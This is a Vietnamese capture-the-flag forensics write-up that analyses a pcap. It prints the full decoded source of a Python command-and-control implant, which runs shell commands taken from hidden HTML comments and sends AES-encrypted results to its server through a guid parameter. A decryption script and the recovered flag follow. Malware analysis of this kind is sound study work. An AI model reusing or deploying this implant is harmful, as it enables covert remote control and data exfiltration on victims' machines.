Tải chall về thu được 1 file pcap và mình thấy được 1 file là client.py :

<img width="1167" height="815" alt="image" src="https://github.com/user-attachments/assets/ac91bee9-2248-4888-ae6a-de2617acaa98" />
Có vẻ như src code của client.py đã bị mã hóa base64, mình decode nó ra thu được mã nguồn gốc của client.py:

```
import requests,random,base64,time,subprocess,hashlib,platform;from Crypto import Random;from Crypto.Cipher import AES;class AESCipher(object):def __init__(self,key):self.bs=16;self.key=hashlib.sha256(AESCipher.str_to_bytes(key)).digest();@staticmethod;def str_to_bytes(data):u_type=type(b''.decode('utf8'));if isinstance(data,u_type):return data.encode('utf8');return data;def _pad(self,s):return s+(self.bs-len(s)%self.bs)*AESCipher.str_to_bytes(chr(self.bs-len(s)%self.bs));@staticmethod;def _unpad(s):return s[:-ord(s[len(s)-1:])];def encrypt(self,raw):raw=self._pad(AESCipher.str_to_bytes(raw));iv=Random.new().read(AES.block_size);cipher=AES.new(self.key,AES.MODE_CBC,iv);return base64.b64encode(iv+cipher.encrypt(raw)).decode('utf-8');def decrypt(self,enc):enc=base64.b64decode(enc);iv=enc[:AES.block_size];cipher=AES.new(self.key,AES.MODE_CBC,iv);return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8');crypto=AESCipher(key="A8d3lR4mGEW#E@n#G7KlYksk239");def random_interval(interval1,interval2):return random.randint(interval1,interval2);hostname=platform.node();req=requests.session();def connect_client():while 1:time.sleep(1);try:hostname_encrypted=crypto.encrypt("magic_hostname="+hostname).encode('utf-8');hostname_encrypted=base64.b64encode(hostname_encrypted).decode('utf-8');html=req.get("http://127.0.0.1/images?guid="+hostname_encrypted,headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'}).text;break;except Exception as err:if"Connection refused"in str(err):pass;else:print("[!] Something went wrong, printing error: "+str(err));connect_client();while 1:try:time.sleep(random_interval(2,8));html=req.get("http://127.0.0.1/",headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'}).text;parse=html.split("<!-- oldcss=")[1].split("-->")[0];parse=crypto.decrypt(parse);if parse=="nothing":pass;else:if hostname in parse:parse=parse.split(hostname+"::::")[1];proc=subprocess.Popen(parse,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE);stdout_value=proc.communicate()[0];stdout_value=crypto.encrypt(hostname+"::::"+str(stdout_value)).encode('utf-8');stdout_value=base64.b64encode(stdout_value).decode('utf-8');html=req.get("http://127.0.0.1/images?guid="+stdout_value,headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'}).text;time.sleep(random_interval(2,8));except Exception as err:if"Connection refused"in str(err):connect_client();else:print("[!] Something went wrong, printing error: "+str(err));except KeyboardInterrupt:print("\n[!] Exiting ModifiedC2 Client...");exit()

```

Đây là 1 mã độc C2 viết bằng python 
Đoạn script này thực hiện 3 nhiệm vụ chính: mã hóa, nhận lệnh và trả kết quả về máy chủ.
Trong src có sẵn hardcore key: crypto = AESCipher(key="A8d3lR4mGEW#E@n#G7KlYksk239") , Dữ liệu trao đổi giữa máy chủ và máy nạn nhân đều dc mã hóa AES mode CBC với khóa này
Cách nhận lệnh: Malware sẽ liên tục gửi request GET / đến máy chủ. Máy chủ trả về một trang HTML, nhưng lệnh điều khiển thực sự được giấu khéo léo bên trong thẻ comment HTML
Cách trả kết quả:Sau khi chạy lệnh bằng subprocess, malware mã hóa kết quả, sau đó Base64 thêm một lần nữa (Double Base64). Cuối cùng, nó gửi kết quả này lên máy chủ qua đường dẫn: GET /images?guid=[DỮ_LIỆU_ĐÃ_MÃ_HÓA_VÀ_B64]
Nắm được logic như vậy mình tiến hành viết script để giải mã lệnh mà máy của attacker đã tác động lên máy nạn nhân:
Mã nguồn decrpyt.py:
```
import base64
import hashlib
from Crypto import Random
from Crypto.Cipher import AES

class AESCipher(object):
    def __init__(self, key):
        self.bs = 16
        self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()

    @staticmethod
    def str_to_bytes(data):
        u_type = type(b''.decode('utf8'))
        if isinstance(data, u_type):
            return data.encode('utf8')
        return data

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

    def encrypt(self, raw):
        raw = self._pad(AESCipher.str_to_bytes(raw))
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

# 1. Khởi tạo khóa
crypto = AESCipher(key="A8d3lR4mGEW#E@n#G7KlYksk239")

# 2. Thay thế chuỗi lấy từ tham số guid= hoặc oldcss= trong Wireshark vào đây
enc_data = "......." 

try:
    # Thử giải mã lớp Base64 ngoài cùng (dành cho dữ liệu exfiltrate từ tham số guid=)
    # Nếu bạn đang giải mã lệnh từ server (oldcss=), có thể bỏ dòng single_b64 này 
    # và truyền thẳng enc_data vào crypto.decrypt()
    single_b64 = base64.b64decode(enc_data).decode('utf-8')
    
    # Giải mã AES
    result = crypto.decrypt(single_b64)
    print("\n[+] KẾT QUẢ GIẢI MÃ:")
    print("-" * 50)
    print(result)
    print("-" * 50)
except Exception as e:
    print("[-] Có lỗi xảy ra. Hãy kiểm tra lại chuỗi mã hóa. Chi tiết:", e)
```
Tiến hành lọc giao thức Http để tìm payload :

<img width="1917" height="942" alt="image" src="https://github.com/user-attachments/assets/579a88fc-0295-494a-8f83-5a22ae5946e9" />

Mình để ý sau guid có đoạn data đã bị mã hóa nên mình đoán payload là ở đây, tiến hành giải mã lần lượt minh thu được kết quả sau:

<img width="1427" height="910" alt="image" src="https://github.com/user-attachments/assets/d6aa859f-15ba-467d-b1c9-5be56f62367c" />

Attacker đã tạo 1 file là flag.txt và nội dung của nó là :VFJVU1RMSU5Fe3RyZXZvcmMyXzFzX3IzNGxseV9mdW59\n

Sau đó decode lại với base64 mình thu được flag:

<img width="1588" height="675" alt="image" src="https://github.com/user-attachments/assets/e7882187-14e1-4218-b9a5-021dedf35b51" />

